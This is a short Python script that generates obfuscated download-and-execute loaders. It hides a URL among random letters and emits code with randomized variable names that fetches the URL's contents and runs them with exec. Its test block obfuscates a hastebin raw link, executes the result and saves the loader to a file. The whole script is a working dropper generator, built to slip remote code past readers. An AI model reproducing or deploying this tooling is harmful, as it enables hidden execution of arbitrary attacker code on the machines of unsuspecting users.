import string
import random
import requests
import json

def randstring(length):
  letters = string.ascii_letters
  return ( ''.join(random.choice(letters) for i in range(length)) )


def hidden_url(url):
  _list = []
  for x in url:
    _list.append(randstring(15)+ x + randstring(16))
    _list.append(randstring(32))
  to_decode="""import requests
jejenwiqohg=requests.get
uaphgwp=""
for uhuibapwiebiubqg in _list[::2]:
  uaphgwp = uaphgwp+uhuibapwiebiubqg[15]
balls = jejenwiqohg(uaphgwp).text
try:  exec(ewiohgan)
except: exec(balls)""".replace("_list", str(_list))
  deez = to_decode.replace("ewiohgan", randstring(32))
  deez1 = deez.replace("balls", randstring(32))
  deez2 = deez1.replace("uhuibapwiebiubqg", randstring(32))
  deez3 = deez2.replace("uaphgwp", randstring(32))

  return(deez3)

def url_obfuscation1(url):
  return(hidden_url(url))


#just for testing :)
if __name__=="__main__":

  code = url_obfuscation1("https://hastebin.com/raw/atoruxezef")
  exec(code)

  #("https://hastebin.com/raw/atoruxezef")
  input()
  with open("testingthings.py", "w+") as file:
    file.write(code)
    file.close()
  
